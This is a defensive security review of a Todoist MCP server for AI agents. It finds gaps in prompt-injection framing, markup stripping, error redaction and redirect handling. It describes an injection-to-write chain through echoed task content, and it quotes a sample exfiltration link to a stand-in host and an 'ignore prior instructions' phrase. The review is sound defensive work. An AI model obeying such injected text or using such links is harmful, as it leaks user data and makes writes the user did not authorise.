<!-- title: Todoist MCP Security Review -->

# Todoist MCP Server — Security Review

**Scope:** `Todoist-MCP/` — `src/*.js`, `src/tools/*.js`, `test/*.js`, `.claude/agents/todoist.md`, `README.md`, `.env.example`, `package.json`.
**Method:** direct code reading of every source and test file, no reliance on comments, docstrings, or the README's own claims. Verdicts are based only on what the code does.
**Not verified:** actual production file permissions on the token file, behavior of any orchestrator agent that might live outside this repository, live behavior against the real Todoist API (tests mock `fetch`).

---

## 1. Verdict summary

| # | Control | Verdict | Why |
|---|---|---|---|
| 1 | SSRF allowlisting on outbound requests | **Implemented** | Exact host/scheme match, enforced on every request. One gap: redirects. |
| 2 | Content framing with untrusted delimiters | **Partial** | Solid on the read path. Entirely absent on the write path. |
| 3 | HTML/markdown stripping | **Partial** | Solid for inline HTML and inline markdown links/emphasis. Misses reference-style links and bare URLs. Entirely absent on the write path. |
| 4 | Token/credential redaction | **Partial** | Solid at the logger and HTTP client layers. Not applied at the final tool-error egress point. |
| 5 | Environment-gated read-only mode | **Implemented** | Fail-closed, enforced at tool registration (not call time), well tested. |

Control #6, two-agent separation with user confirmation before write, has been withdrawn from this inventory: it described an intended design that was never implemented, and no claim should rest on it.

Three of the five controls you believe you have are not fully there. Two of those three, #2 and #3, are partial for the same reason — neither is applied on the write path — which is Finding 1 below.

---

## 2. Findings, most severe first

### Finding 1 — Write tool results bypass framing and stripping entirely
**Severity: Critical.** This defeats controls #2 and #3 on the one path where it matters most — the write-enabled agent.

`src/tools/write.js` never imports `sanitize.js` or `shape.js`. Every write tool builds its result through:

```js
// write.js:25-27
function writeResult(payload) {
  return { content: [{ type: 'text', text: JSON.stringify(payload, null, 2) }] };
}
```

No `safeField`, no `stripMarkup`, no `UNTRUSTED_NOTICE`, no `capOutput`. Compare this to `read.js`'s `readResult()`, which applies all four.

**Concrete attack.** `update-tasks` (`write.js:118-128`):

```js
const updated = await client.request('POST', `/tasks/${encodeURIComponent(id)}`, { body });
results.push({ id, ok: true, content: updated?.content });
```

`body` contains only the fields the caller supplied for this call. Todoist's `POST /tasks/{id}` is a partial update — the response reflects the task's full current state, including any field the caller didn't touch. So:

1. An attacker (a shared-project collaborator, a synced integration, anyone who can get text into a task's `content` field) plants a prompt-injection payload in a task.
2. The write-enabled agent later calls `update-tasks` on that task for something unrelated — bumping `priority`, say — without including `content` in the body.
3. Todoist's response still carries the untouched malicious `content`.
4. `write.js` echoes it straight into the tool result: raw, unframed, unstripped, uncapped.
5. That text lands in the context of the only agent in this system that holds write tools.

This is exactly the injection-to-write chain the read-path controls exist to prevent, reopened through the write path. `add-tasks` has the same code shape (`content`, `url` echoed raw at `write.js:86`) but is lower risk there since that content is self-authored in the same call.

**Fix.** Route every echoed text field through `safeField` (or at minimum `stripMarkup`) before it leaves `writeResult`. The cleanest fix is to give write tools their own `shapeTask`-style pass, reusing the same functions `read.js` already uses, so there's one code path for "text that came from Todoist," not two.

---

### Finding 2 — Two-agent separation with user confirmation is absent
**Severity: Critical** (as described in your control list) / accurately disclosed in your own agent file, but not as a technical control.

Only one agent definition exists in this repo: `.claude/agents/todoist.md`. It is not read-only, and it does not relay to a second, confirmation-gated agent — it is itself write-capable by its own checked-in frontmatter:

```yaml
env:
  TODOIST_READONLY: "false"
```

The only thing resembling "confirmation" is prose in the agent's working-style section:

> "For destructive-adjacent changes... briefly restate what you're about to do, then do it — you are the write-capable agent, so act."

That's model self-narration within the same turn, not a gate that waits on actual user input. Nothing in `server.js` or `write.js` pauses execution for anything; a write tool call executes the moment the model emits it.

If a separate, read-only orchestrator that gates writes on user confirmation exists outside this repository, I did not see it and can't verify it — everything reviewed here is self-contained in `Todoist-MCP/`. Based on what's actually in this repo, this control does not exist. If such an orchestrator does exist elsewhere, it needs to be brought into scope of the writeup and this review before you claim #6.

---

### Finding 3 — Redaction is not applied at the final tool-error egress point
**Severity: High.**

`redact.js` states: *"This module is the single choke point: everything logged or thrown passes through redact()."* That's not true for the point where errors actually leave the process.

`read.js:35-42` and `write.js:43-49` (identical pattern in both):

```js
} catch (err) {
  return { isError: true, content: [{ type: 'text', text: `Error: ${err.message}` }] };
}
```

`err.message` is used directly — no `redact()` call at this boundary. It relies entirely on the assumption that the message was "already redacted at the client layer." That's true for `TodoistApiError` and the network-error path in `client.js`, both of which do call `redact()` before throwing. It is **not** enforced for any error that originates elsewhere: a bug in a handler, a future contributor building a message that includes `cfg.apiKey` directly, a thrown error from a dependency. Any such message reaches the agent completely unredacted. This is precisely the class of gap "belt-and-suspenders" redaction is supposed to close, and here the final belt is missing.

**Fix.** Wrap `err.message` in `redact()` in both catch blocks, regardless of upstream discipline. One line each, in two places.

---

### Finding 4 — Reference-style markdown links and bare URLs are not neutralized
**Severity: Medium.**

`sanitize.js:43`:

```js
text = text.replace(/!?\[([^\]]*)\]\([^)]*\)/g, '$1');
```

This only matches inline syntax, `[label](url)`. Reference-style markdown is not matched:

```
[Click here][1]

[1]: http://evil.example/exfil?x=SECRET
```

Square brackets are also never in the defang character class (`sanitize.js:47`, `` [`*_~#>|] ``), so both the `[Click here][1]` reference and the `[1]: http://...` definition line survive `stripMarkup` completely intact, URL included. Bare URLs with no markdown syntax at all also pass through untouched — nothing targets them.

This directly contradicts the stated intent at `sanitize.js:41-42` ("drop the target so no clickable/again-parseable URL survives") for this syntax variant.

**Fix.** Either strip the `[...]:\s*\S+` reference-definition pattern and defang bare `[...]` bracket pairs, or — simpler and more robust — generically neutralize any `https?://\S+` sequence rather than relying on markdown-syntax pattern matching to catch every way a URL can be embedded.

---

### Finding 5 — SSRF allowlist is not re-checked across redirects
**Severity: Low** (real gap, low practical likelihood given the current design).

`client.js:88`:

```js
res = await fetch(url.toString(), { method, headers, body: payload });
```

No `redirect` option is set, so Node's fetch defaults to `redirect: "follow"`. `assertAllowedUrl` (`client.js:39-57`) validates the URL once, before the initial request. If the response were a 3xx, fetch would follow it to whatever `Location` header value without a second check.

Practical severity is low because the host is hardcoded to the literal string `api.todoist.com` (`client.js:15-16`) and never derived from any tool argument — no tool in this server accepts a URL. That closes off essentially the entire SSRF bypass checklist (DNS rebinding, IPv6/octal/decimal encodings, link-local/metadata hosts, substring matching, userinfo tricks, homographs): none of them apply when the compared string is never attacker-influenced, and the comparison is exact equality (`!==`), not substring. The redirect gap is the one thing that's real regardless, and it's a one-line fix.

**Fix.** `fetch(url, { redirect: 'manual' })`, and treat any 3xx as an error (or re-validate the `Location` header with `assertAllowedUrl` before manually following it).

---

### Finding 6 — Numeric HTML entities are not decoded
**Severity: Informational.** Not currently exploitable, worth closing for completeness.

`sanitize.js:32-37` decodes only named entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&apos;`/`&#39;`), not numeric ones (`&#60;`, `&#x3C;`). Because the final blanket pass (`sanitize.js:39`, `text.replace(/[<>]/g, ' ')`) only strips characters that are literally `<`/`>`, an undecoded numeric entity is left as inert text (`&#60;script&#62;`) rather than becoming a live tag. Not exploitable within this server's own output today, but if any downstream renderer decodes entities on display, this gap becomes live. Cheap to close.

---

## 3. Also checked, no separate finding

- **Tool descriptions/schemas as an injection surface.** Clean. All `description`/`title` strings in `read.js`/`write.js` are static, developer-authored, never populated from API data.
- **Secrets in logs.** Clean at the logger layer — `logger.js` redacts every line, and `client.js` deliberately never logs headers or request bodies.
- **Least privilege of the credential the server holds.** Not achieved, but not your fault: Todoist personal API tokens are always full read+write, account-wide, with no scoping mechanism. Already disclosed honestly in your README. Just don't let the writeup imply the *server* narrows this — it can't.
- **Fundamental limit of framing/stripping against plain-prose injection.** Framing and stripping stop markup- and link-based delivery. They do nothing against a task that just says, in plain English, "ignore prior instructions and do X." The only defense there is the model choosing to respect the fence, which is policy, not a technical control. Your own agent file says this plainly already — the writeup should be equally direct that this is instruction-following discipline, not enforcement.

---

## 4. What you could not honestly claim today

- "A read-only agent relays to a write-capable agent that requires explicit user confirmation before any write." — not present (Finding 2).
- "Tool-returned content is framed and stripped before reaching the agent." — true only for the 7 read tools, false for all 9 write tools (Finding 1).
- "Everything logged or thrown passes through redact(), single choke point." — not accurate; two catch blocks bypass it (Finding 3).
- "Markdown stripping removes clickable/parseable URLs so none survive." — false for reference-style links and bare URLs (Finding 4).
- Any claim of credential-level least privilege — the token is always full read+write by Todoist's own design.

---

## 5. Fix checklist for the next session

Ordered by what actually reduces risk first, not file order.

**Must fix before publishing:**
- [ ] Route all write-tool results through `safeField`/`stripMarkup` (Finding 1). This is the one that actually reopens the attack the whole project is about.
- [ ] Either build the second, confirmation-gated agent your control #6 describes, or stop claiming it and describe the real architecture (single write-enabled agent, server-layer read/write gate only) — which your README already does correctly in the "Note on the security posture" section of `todoist.md`. Decide which one you want and make the code and the claim match (Finding 2).
- [ ] Add `redact()` around `err.message` in the catch blocks in both `read.js` and `write.js` (Finding 3).

**Should fix:**
- [ ] Extend `stripMarkup` to catch reference-style markdown links (`[x][1]` + `[1]: url`) and bare URLs, not just inline `[x](url)` (Finding 4).
- [ ] Set `redirect: 'manual'` on the `fetch` call in `client.js` and reject/re-validate 3xx responses (Finding 5).

**Nice to have:**
- [ ] Decode numeric HTML entities (`&#NN;`, `&#xHH;`) in `stripMarkup` for completeness (Finding 6).
- [ ] Consider applying `capOutput`/`maxFieldChars` to write-tool results too, once they're routed through the sanitizer — right now writes have no size cap at all, only reads do.

**Before writing the public post:**
- [ ] Re-run the existing test suite after each fix — it's a good suite, extend it rather than replace it. In particular, add a write-path test mirroring the existing `mcp-e2e.test.js` framing test, but calling `update-tasks` with a body that omits `content`, and asserting the untouched `content` in the result is framed and stripped.
- [ ] Add a test that throws a raw `Error` (not a `TodoistApiError`) containing the registered secret from inside a handler, and assert it does not appear in the tool result — this is the test that would have caught Finding 3.
- [ ] Reconcile the README and `.claude/agents/todoist.md` claims with whatever you land on for #6 before publishing, since right now the deployed config (`TODOIST_READONLY: "false"`) and the README's "does not protect against a compromised orchestrator" caveat are honest about the real posture, but your control list to me claimed something stronger than what's built.
